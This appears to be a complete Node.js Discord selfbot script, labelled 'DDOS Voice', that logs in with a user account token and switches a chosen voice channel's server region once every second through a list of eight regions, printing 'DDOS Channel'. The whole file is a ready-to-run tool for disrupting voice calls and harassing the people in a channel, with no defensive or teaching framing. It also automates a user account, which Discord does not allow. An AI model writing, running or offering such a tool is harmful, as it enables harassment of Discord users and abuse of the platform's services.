const discord = require('discord.js-selfbot-v13')
const client = new discord.Client({checkUpdate: false})

const fs = require('fs')
if (!fs.existsSync("./config.js")) fs.writeFileSync(`./config.js`, 'module.exports = {\n    token: "" // Place your token here\n}');

const consolecolor = require('gradient-string');
const { setMaxIdleHTTPParsers } = require('http');

const q = require('readline-sync')

const config = require('./config')


const token = config.token || process.env.token
if (!token) throw new TypeError("You must place your token in the config file")

client.login(token).catch(() => console.log(consolecolor("#873d7e", "#1e1854")("[!] Invalid token ! Change it in the config file")))

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

async function main() {
    console.clear()
    console.log(consolecolor("#873d7e", "#28136e")(`
                    ▓█████▄ ▓█████▄  ▒█████    ██████     ██▒   █▓ ▒█████   ██▓ ▄████▄  ▓█████ 
                    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓██░   █▒▒██▒  ██▒▓██▒▒██▀ ▀█  ▓█   ▀ 
                    ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄       ▓██  █▒░▒██░  ██▒▒██▒▒▓█    ▄ ▒███   
                    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒     ▒██ █░░▒██   ██░░██░▒▓▓▄ ▄██▒▒▓█  ▄ 
                    ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒      ▒▀█░  ░ ████▓▒░░██░▒ ▓███▀ ░░▒████▒
                     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░      ░ ▐░  ░ ▒░▒░▒░ ░▓  ░ ░▒ ▒  ░░░ ▒░ ░
                     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░      ░ ░░    ░ ▒ ▒░  ▒ ░  ░  ▒    ░ ░  ░
                     ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░          ░░  ░ ░ ░ ▒   ▒ ░░           ░   
                       ░       ░        ░ ░        ░           ░      ░ ░   ░  ░ ░         ░  ░
                     ░       ░                                ░                ░               
    `))

    const channelid = q.question(consolecolor("#431dbf", "#af1dbf")("[~] What's the channel ID : "))
    const channel = client.channels.cache.get(channelid)
    if (!channel){
        console.log(consolecolor("#431dbf", "#af1dbf")("[!] No channel found"))
        await sleep(2000)
        main()
    }
    let i = 0;
    const region = ["japan", "hongkong", "russia", "india", "brazil", "sydney", "rotterdam", "singapore"];
    setInterval(() => {
        console.log(consolecolor("#431dbf", "#af1dbf")("[+] DDOS Channel..."))
        channel.setRTCRegion(region[i]).catch(() => console.error()), i++;
        if (i === region.length || i > region.length) i = 0;
    }, 1000)

    
    
}


client.on('ready', () => main())